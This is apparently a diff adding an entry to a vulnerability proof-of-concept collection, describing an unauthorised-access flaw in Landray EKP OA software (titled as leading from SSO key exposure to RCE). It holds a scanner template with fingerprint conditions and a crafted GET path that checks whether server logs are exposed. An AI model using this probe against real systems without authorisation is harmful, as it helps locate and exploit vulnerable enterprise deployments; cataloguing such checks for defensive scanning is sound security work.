@@ -1,0 +1,7 @@
+vendor = "蓝凌"
+name = "蓝凌OA存在未授权获取sso key到rce"
+type = "信息泄露、RCE"
+source = "DVB、TG"
+date = "08.08"
+poc = "Name: 深圳市蓝凌软件股份有限公司-EKP系统-存在未授权访问漏洞 Description: 蓝凌EKP由深圳市蓝凌软件股份有限公司自出研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。 包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。。攻击者可利用漏洞获取大量敏感信息。 Identifier: DVB: DVB-2023-4863 VulnClass: - 信息泄漏 Category: - 应用服务 Manufacturer: 蓝凌 Product: EKP Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2023-07-11' Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"蓝凌云服务平台\"||(body=\"Landray\"&&body=\"登录系统\")||body=\"/scripts/jquery.landray.common.js\"||body=\"java.landray.com.cn\"||body=\"蓝凌软件\" ||(body=\"StylePath\" && body=\"encryptPassword\") Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /./ui-ext/./behavior/ headers: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36 follow_redirects: false matches: (code.eq(\"200\") && body.contains(\"ekp_server.log\"))"
+label = "nday"
